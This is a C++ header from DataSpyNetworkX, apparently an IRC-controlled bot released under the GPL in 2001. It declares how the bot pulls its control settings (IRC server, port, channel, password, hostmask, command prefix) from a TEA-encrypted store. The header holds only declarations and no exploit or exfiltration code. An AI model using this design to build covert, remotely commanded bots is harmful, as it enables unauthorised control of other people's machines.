/* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#ifndef _INC_GETSETTINGSTORAGE_H_
#define _INC_GETSETTINGSTORAGE_H_
#define NO_SETTINGS 7

#include "../include/options.h"

enum GSetting { IRCPT =0, IRCCH =1 , IRCSV =2 , PASSW =3 ,HMASK =4, MBPFX =5 , RTOCH =6 };
// :port:channel:server:passwd:host:prefix:reply:
//    1     2       3      4     5      6   7
class SettingRetrv
{
public:
	SettingRetrv();
	char *GetSetting(enum GSetting iSetting);
private:
	char *cSetting[NO_SETTINGS];
	//BOOL *bSettingChanged[6];
};

void Decode(char *cDecode,unsigned long *s_Keys,long iLen);
void TEADecrypt(const unsigned long *const v,unsigned long *const w,const unsigned long * const k);

#ifdef _DSNX_USE_GETSETTING

extern SettingRetrv *g_SStore;

#define _DSNX_IRCSERVER   g_SStore->GetSetting(IRCSV)
#define _DSNX_CHANNEL     g_SStore->GetSetting(IRCCH)
#define _DSNX_PASSWORD    g_SStore->GetSetting(PASSW)
#define _DSNX_PORT        g_SStore->GetSetting(IRCPT)
#define _DSNX_PREFIX      g_SStore->GetSetting(MBPFX)
#define _DSNX_REPLYTOCHAN g_SStore->GetSetting(RTOCH)
#define _DSNX_HOSTMASK    g_SStore->GetSetting(HMASK)

#else

#define _DSNX_IRCSERVER   c_DSNX_IRCSERVER
#define _DSNX_CHANNEL     c_DSNX_CHANNEL
#define _DSNX_PASSWORD    c_DSNX_PASSWORD
#define _DSNX_PORT        c_DSNX_PORT
#define _DSNX_PREFIX      c_DSNX_PREFIX
#define _DSNX_REPLYTOCHAN c_DSNX_REPLYTOCHAN
#define _DSNX_HOSTMASK    c_DSNX_HOSTMASK

extern char c_DSNX_PREFIX[];
extern char c_DSNX_PASSWORD[];
extern char c_DSNX_HOSTMASK[];
extern char c_DSNX_IRCSERVER[];
extern char c_DSNX_CHANNEL[];
extern char c_DSNX_PORT[];
extern char c_DSNX_REPLYTOCHAN[];

#endif

#endif